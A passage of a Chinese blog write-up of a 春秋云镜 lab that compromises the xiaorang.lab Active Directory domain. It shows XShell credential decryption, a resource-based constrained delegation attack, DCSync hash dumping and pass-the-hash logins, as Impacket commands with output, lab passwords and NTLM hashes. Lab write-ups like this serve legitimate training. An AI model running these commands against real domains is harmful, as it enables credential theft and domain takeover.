+<p>然后可以看到<code>ZHANGXIN</code>用户属于<code>account operators</code>组，对<code>FILESERVER</code>机器用户有<code>GenericAll</code>权限</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310232113821.png" title="image-20231023211330683" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310232113821.png" alt="image-20231023211330683"></a></p>
+<p>所有现在需要拥有<code>ZHANGXIN</code>用户的凭据</p>
+<p>扫描发现，<code>172.22.60.15</code>主机是开了3389端口的</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241523483.png" title="image-20231024152331391" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241523483.png" alt="image-20231024152331391"></a></p>
+<p>使用<code>wangyun/Adm12geC</code>登录PC1</p>
+<h2 id="XShell凭据解密"><a href="#XShell凭据解密" class="headerlink" title="XShell凭据解密"></a>XShell凭据解密</h2><p>在里面看到了<code>ZHANGXIN</code>的用户文件夹</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241525571.png" title="image-20231024152557490" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241525571.png" alt="image-20231024152557490"></a></p>
+<p>同时zhangxin还用xshell连接过其他机器</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241526762.png" title="image-20231024152642672" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241526762.png" alt="image-20231024152642672"></a></p>
+<p>如果要用mimikatz来抓取本地凭证的话，需要有system权限，所以尝试使用xshell7里遗留的凭证来撞库</p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/JDArmy/SharpXDecrypt">SharpXDecrypt</a></p>
+<p>得到zhangxin的凭据：<code>zhangxin/admin4qwY38cc</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241542546.png" title="image-20231024154237493" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241542546.png" alt="image-20231024154237493"></a></p>
+<p>使用这个凭据可以成功登录当前主机</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241544976.png" title="image-20231024154406894" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241544976.png" alt="image-20231024154406894"></a></p>
+<h2 id="RBCD攻击拿下FILESERVER主机"><a href="#RBCD攻击拿下FILESERVER主机" class="headerlink" title="RBCD攻击拿下FILESERVER主机"></a>RBCD攻击拿下FILESERVER主机</h2><p>现在看来，最大的突破点就是zhangxin是<code>Acount Operators组</code>的用户，而此组可以控制域内除域控之外所有用户的属性</p>
+<p>所有可以通过RBCD（基于资源的约束性委派）进行攻击</p>
+<p>参考：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://exp10it.cn/2023/08/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-rbcd-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">基于资源的约束委派-rbcd-利用总结</a></p>
+</li>
+</ul>
+<p>先创一个机器账户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python addcomputer.py xiaorang.lab/zhangxin:<span class="string">&#x27;admin4qwY38cc&#x27;</span> -computer-name TEST\$ -computer-pass 123456 -dc-ip 172.22.60.8 </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241644493.png" title="image-20231024164410439" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241644493.png" alt="image-20231024164410439"></a></p>
+<p>然后将FILESERVER$账户的基于资源的约束性委派对象设置为<code>TEST$</code></p>
+<p>即设置他的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性值</p>
+<p>这样<code>TEST$</code>服务就可以代表<code>FILESERVER$</code>去访问FILESERVER可以访问的服务了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python rbcd.py xiaorang.lab/zhangxin:<span class="string">&#x27;admin4qwY38cc&#x27;</span> -dc-ip 172.22.60.8  -action write -delegate-to FILESERVER\$ -delegate-from TEST\$</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241724326.png" title="image-20231024172423290" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241724326.png" alt="image-20231024172423290"></a></p>
+<p>然后创建一个访问FILESERVER主机CIFS服务的服务票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python getST.py xiaorang.lab/TEST\$:123456 -spn cifs/FILESERVER.xiaorang.lab -impersonate administrator -dc-ip 172.22.60.8</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241734097.png" title="image-20231024173414050" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241734097.png" alt="image-20231024173414050"></a></p>
+<p>导入票据，直接登录FILESERVER主机，要修改一下hosts文件</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241749415.png" title="image-20231024174915389" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241749415.png" alt="image-20231024174915389"></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">proxychains4 -q python3 wmiexec.py -k FILESERVER.xiaorang.lab -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241749175.png" title="image-20231024174902140" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241749175.png" alt="image-20231024174902140"></a></p>
+<p>得到flag03: flag{9cc56fb3-e9b1-4345-8e1c-18ed495811a8}</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241750072.png" title="image-20231024175022036" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241750072.png" alt="image-20231024175022036"></a></p>
+<h2 id="DCSync获取域管凭据"><a href="#DCSync获取域管凭据" class="headerlink" title="DCSync获取域管凭据"></a>DCSync获取域管凭据</h2><p>上面知道，FILESERVE有DCSync权限，可以用这个来获取全域的用户凭据</p>
+<p>先dumphash，来到<code>FILESERVE$</code>账户的凭据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/tools/impacket-0.10.0/examples]</span><br><span class="line">└─$ proxychains4 -q python3 secretsdump.py -k FILESERVER.xiaorang.lab -no-pass -dc-ip 172.22.60.8</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python3 secretsdump.py -k FILESERVER.xiaorang.lab -no-pass -dc-ip 172.22.60.8</span><br><span class="line">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0xef418f88c0327e5815e32083619efdf5</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:bd8e2e150f44ea79fff5034cad4539fc:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b40dda6fd91a2212d118d83e94b61b11:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:<span class="built_in">hash</span>)</span><br><span class="line">XIAORANG.LAB/Administrator:$DCC2<span class="variable">$10240</span><span class="comment">#Administrator#f9224930044d24598d509aeb1a015766</span></span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] <span class="variable">$MACHINE</span>.ACC </span><br><span class="line">XIAORANG\Fileserver$:plain_password_hex:3000310078005b003b0049004e003500450067003e00300039003f0074006c00630024003500450023002800220076003c004b0057005e0063006b005100580024007300620053002e0038002c0060003e00420021007200230030003700470051007200640054004e0078006000510070003300310074006d006b004c002e002f0059003b003f0059002a005d002900640040005b0071007a0070005d004000730066006f003b0042002300210022007400670045006d0023002a002800330073002c00320063004400720032002f003d0078006a002700550066006e002f003a002a0077006f0078002e0066003300</span><br><span class="line">XIAORANG\Fileserver$:aad3b435b51404eeaad3b435b51404ee:951d8a9265dfb652f42e5c8c497d70dc:::</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0x15367c548c55ac098c599b20b71d1c86a2c1f610</span><br><span class="line">dpapi_userkey:0x28a7796c724094930fc4a3c5a099d0b89dccd6d1</span><br><span class="line">[*] NL<span class="variable">$KM</span> </span><br><span class="line"> 0000   8B 14 51 59 D7 67 45 80  9F 4A 54 4C 0D E1 D3 29   ..QY.gE..JTL...)</span><br><span class="line"> 0010   3E B6 CC 22 FF B7 C5 74  7F E4 B0 AD E7 FA 90 0D   &gt;..<span class="string">&quot;...t........</span></span><br><span class="line"><span class="string"> 0020   1B 77 20 D5 A6 67 31 E9  9E 38 DD 95 B0 60 32 C4   .w ..g1..8...`2.</span></span><br><span class="line"><span class="string"> 0030   BE 8E 72 4D 0D 90 01 7F  01 30 AC D7 F8 4C 2B 4A   ..rM.....0...L+J</span></span><br><span class="line"><span class="string">NL<span class="variable">$KM</span>:8b145159d76745809f4a544c0de1d3293eb6cc22ffb7c5747fe4b0ade7fa900d1b7720d5a66731e99e38dd95b06032c4be8e724d0d90017f0130acd7f84c2b4a</span></span><br><span class="line"><span class="string">[*] Cleaning up... </span></span><br><span class="line"><span class="string">[*] Stopping service RemoteRegistry</span></span><br></pre></td></tr></table></figure>
+
+<p>然后进行DCSync，获取域管的凭据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/tools/impacket-0.10.0/examples]</span><br><span class="line">└─$ proxychains4 -q python3 secretsdump.py  xiaorang.lab/FILESERVER\<span class="variable">$@172</span>.22.60.8 -hashes :951d8a9265dfb652f42e5c8c497d70dc  -no-pass -dc-ip 172.22.60.8 -just-dc-user administrator</span><br><span class="line">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c3cfdc08527ec4ab6aa3e630e79d349b:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:4502e83276d2275a8f22a0be848aee62471ba26d29e0a01e2e09ddda4ceea683</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:38496df9a109710192750f2fbdbe45b9</span><br><span class="line">Administrator:des-cbc-md5:f72a9889a18cc408</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure>
+
+<p>hash传递，登录域管</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes :c3cfdc08527ec4ab6aa3e630e79d349b administrator@172.22.60.8</span><br></pre></td></tr></table></figure>
+
+<p>获得flag04: flag{4635667c-14e5-487d-a447-7bc82b2b0a0c}</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241806024.png" title="image-20231024180617986" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241806024.png" alt="image-20231024180617986"></a></p>
+<p>还有一个flag应该在PC1，直接使用域管的hash进行访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/administrator@172.22.60.15</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag02: flag{9fb4e376-0e89-4fbb-8ab4-625f8b7d7d0b}</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241839293.png" title="image-20231024183913256" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310241839293.png" alt="image-20231024183913256"></a></p>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/'>
+                            春秋云镜
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
